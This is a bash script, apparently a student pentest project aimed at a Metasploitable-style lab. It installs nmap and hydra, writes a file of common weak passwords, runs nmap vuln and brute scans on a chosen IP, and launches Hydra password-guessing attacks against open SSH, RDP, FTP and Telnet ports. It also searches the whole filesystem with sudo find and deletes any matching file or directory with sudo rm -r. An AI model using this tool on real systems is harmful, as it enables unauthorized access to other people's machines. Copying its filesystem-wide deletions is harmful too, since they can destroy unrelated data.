#!/bin/bash


# Define colors using tput
GREEN=$(tput setaf 2)
RED=$(tput setaf 1)
BLUE=$(tput setaf 4)
RESET=$(tput sgr0)


# Define constants
SSH_PORT=22
RDP_PORT=3389
FTP_PORT=21
TELNET_PORT=23

# Record the start time when the script starts
start_time=$(date +%s)

#Verifying if figlet is installed if not, installing figlet.
function INSTALL_FIGLET() {
	
if ! command -v figlet &> /dev/null; 
	then
		sudo apt-get install -y figlet &> /dev/null 
	fi
	
	#Using figlet command to display PTvU and echo command for the color red.
	echo -e "\e[31m$(figlet PTvUL :0)\e[0m"
}


#start time fo the script
function START_TIME () {
	
	echo -e ""
	echo "${GREEN}[*]${RESET}Pt started at: ${BLUE}[$(date -d @$start_time '+%Y-%m-%d %H:%M:%S')]${RESET}"
	echo -e ""
	

}


#installing need applictions
function INSTALL_APP() {
	
	
	
	if ! command -v nmap &>/dev/null;
	then 
		echo "${GREEN}[@]${RESET}Downloading nmap...."
		sudo apt-get install -y nmap &>/dev/null
	fi
	
	
	if ! command -v hydra &>/dev/null;
	then 
		echo "${GREEN}[@]${RESET}Downloading hydra..."
		sudo apt install -y hydra &>/dev/null
	fi
	
	
}

function CREATEPASS() {

    # Define the password list as an array
    password=("msfadmin" "root" "anonymous" "123123" "123456" "password" "letmein" "qwerty" "secret" "abc123" "admin123" "welcome" "sunshine" "dragon" "football" "monkey" "iloveyou" "1234" "111111" "123abc" "test123" "password123" "qwerty123" "12345" "12345678" "password1" "123321" "qwertyuiop" "superman" "555555")

    # Write each password to the password_list.txt file
    for pass in "${password[@]}"; do
        echo "$pass" >> $directory/password_list.txt
    done
}

#user will be ask to put ip addres
function INPUT() {
    read -rp "${GREEN}[?]${RESET}Enter the IP that you want to scan: " ip >&2
    read -rp "${GREEN}[?]${RESET}Specify the name of the output directory: " directory
    sudo mkdir -p "$directory"
}


#choose basic or full scan 
function CHOOSE() {

    echo -e ""

    while true; do
        read -rp "${GREEN}[?]${RESET}Specified what scan would you like (Basic/Full): " choose

        if [[ "$choose" == "Basic" || "$choose" == "Full" ]]; then
            break  # Exit the loop since a valid input is provided
        else
            echo "${RED}[-]${RESET}Error: Please enter either 'Basic' or 'Full'."
        fi
    done
}


#scan with nmap the target 
function SCAN() {


    if [ "$choose" == "Basic" ]; then
        # Basic scan
        echo "${GREEN}[#]${RESET}Start Basic nmap scan"
        sudo nmap -sC -sU -sV -p 21 --script=brute "$ip" -oN "$directory/basic_scan.txt" &>/dev/null
        echo "${GREEN}[#]${RESET}Finish nmap Basic scan"
        echo "${GREEN}[#]${RESET}Basic scan saved in: $directory/basic_scan.txt"
    elif [ "$choose" == "Full" ]; then
        # Full scan with NSE, weak passwords, and vulnerability analysis
        echo "${GREEN}[#]${RESET}Start Full nmap scan"
        sudo nmap -sC -sU -sV -p 21 --script=vuln,brute "$ip" -oN "$directory/full_scan.txt" &>/dev/null
        echo "${GREEN}[#]${RESET}Finish nmap Full scan"
        echo "${GREEN}[#]${RESET}Scan Save in: $directory/full_scan.txt"

        # Ask user if they want to perform brute force attack
        read -rp "${GREEN}[?]${RESET}Do you want to perform a brute force attack? (yes/no): " brute_choice

        if [ "$brute_choice" == "yes" ]; then
            CHECK_PORTS
        else
            echo "[#]Skipping brute force."
        fi
    else
        echo "${RED}[-]${RESET}Error: Invalid choice. Please enter 'Basic' or 'Full'."
    fi
}



function CHECK_PORTS() {


    location_password=$(sudo find / -type f -name password_list.txt 2>/dev/null)
    touch "$directory/brute_force_results.txt"

    echo "${GREEN}[#]${RESET}Checking for available services on specified ports..."

    open_ports=()

    # Check SSH (port 22)
    nc -z -w 2 "$ip" "$SSH_PORT" && open_ports+=("$SSH_PORT")

    # Check RDP (port 3389)
    nc -z -w 2 "$ip" "$RDP_PORT" && open_ports+=("$RDP_PORT")

    # Check FTP (port 21)
    nc -z -w 2 "$ip" "$FTP_PORT" && open_ports+=("$FTP_PORT")

    # Check Telnet (port 23)
    nc -z -w 2 "$ip" "$TELNET_PORT" && open_ports+=("$TELNET_PORT")

    # Check if at least one port is open
    if [ "${#open_ports[@]}" -gt 0 ]; then
        echo "${GREEN}[#]${RESET}The available port are: ${open_ports[@]}"

        for brute_port in "${open_ports[@]}"; do
            # Determine the service based on the provided port
            case "$brute_port" in
                22)
                    service="ssh"
                    ;;
                3389)
                    service="rdp"
                    ;;
                21)
                    service="ftp"
                    ;;
                23)
                    service="telnet"
                    ;;
                *)
                    echo "${RED}[-]${RESET}Invalid port. Skipping brute force."
                    continue
                    ;;
            esac

            # Ask user if they want to use the default password list
            read -rp "${GREEN}[?]${RESET}Do you want to use the default password list? (yes/no): " default_list

            if [ "$default_list" == "yes" ]; then
                # Use predefined password list with Hydra
                echo -e ""
                echo "${GREEN}[#]${RESET}Starting Hydra brute force attack with default password list on port $brute_port..."
                hydra -l msfadmin -P $location_password "$service://$ip:$brute_port" >> "$directory/brute_force_results.txt" 2>&1
                echo "${GREEN}[#]${RESET}Finish Hydra brute force attack on port $brute_port."
            else
                # Ask user for the path to their password list file
                echo -e ""
                read -rp "[?]Enter the path to your password list file: " custom_list
                # Use custom password list with Hydra
                echo "${GREEN}[#]${RESET}Starting Hydra brute force attack with custom password list on port $brute_port..."
                hydra -l msfadmin -P "$custom_list" "$service://$ip:$brute_port" >> "$directory/brute_force_results.txt" 2>&1
                echo "${GREEN}[#]${RESET}Finish Hydra brute force attack on port $brute_port."
            fi
        done

        # Echo the full path of the Hydra result file
        echo "${GREEN}[#]${RESET}Hydra results saved in: $directory/brute_force_results.txt"
    else
        echo "${GREEN}[#]${RESET}All specified ports are unavailable. Skipping brute force."
    fi

    sudo rm -r $location_password
}








#display the out put of the nmap scan result
function DISPLAY {

    Fullscan_location=$(sudo find /  -type f -name full_scan.txt 2>/dev/null)
    Basicscan_location=$(sudo find /  -type f -name basic_scan.txt 2>/dev/null)

    echo -e ""

    while true; do
        read -rp "${GREEN}[?]${RESET}Would you like to display the result (yes/no): " yesno

        if [ "$yesno" == "yes" ]; then
            echo "${GREEN}[#]${RESET}The Results."

            # Check if basic scan file exists before attempting to display its contents
            if [ -f "$Basicscan_location" ]; then
                echo "${GREEN}[#]${RESET}Basic scan result:"
                cat "$Basicscan_location" 2>/dev/null
            fi

            # Check if full scan file exists before attempting to display its contents
            if [ -f "$Fullscan_location" ]; then
                echo "${GREEN}[#]${RESET}Full scan result:"
                cat "$Fullscan_location" 2>/dev/null
            fi

            break  # Exit the loop since a valid input is provided
        elif [ "$yesno" == "no" ]; then
            break  # Exit the loop since a valid input is provided
        else
            echo "${RED}[-]${RESET}invalid input. Please enter 'yes' or 'no'."
        fi
    done
}





# Zip the directory and then remove it
function ZIP {
    local directory_paths=$(sudo find / -type d -name "$directory" 2>/dev/null)
    local zip_name="PTvulm.zip"

    if [ -z "$directory_paths" ]; then
        echo "${RED}[-]${RESET}Error: Directory not found."
        exit 1
    fi

    for directory_path in $directory_paths; do
        # Get the parent directory of the analysis directory
        parent_directory=$(dirname "$directory_path")

        # Change to the parent directory
        cd "$parent_directory" || { echo "Error changing directory"; exit 1; }

        # Archive the directory using zip
        sudo zip -r "$zip_name" "$(basename "$directory_path")" &>/dev/null

        # Remove the directory
        sudo rm -r "$directory_path"
    done

    echo -e ""
    echo "${GREEN}[#]${RESET}Analysis Completed and saved as: $zip_name"
}









# Function to display the elapsed time
function DISPLAY_ELAPSED_TIME() {
    end_time=$(date +%s)
    elapsed_seconds=$((end_time - start_time))
    elapsed_minutes=$((elapsed_seconds / 60))
    elapsed_seconds=$((elapsed_seconds % 60))

    echo "${GREEN}[*]${RESET}Script finished at: ${BLUE}[$(date -d "@$end_time" '+%Y-%m-%d %H:%M:%S')]${RESET}"
    echo "${GREEN}[*]${RESET}Pt lated time: [${elapsed_minutes}m ${elapsed_seconds}s]"
}

INSTALL_FIGLET
START_TIME
INSTALL_APP
CREATEPASS
INPUT
CHOOSE
SCAN
DISPLAY
ZIP
DISPLAY_ELAPSED_TIME















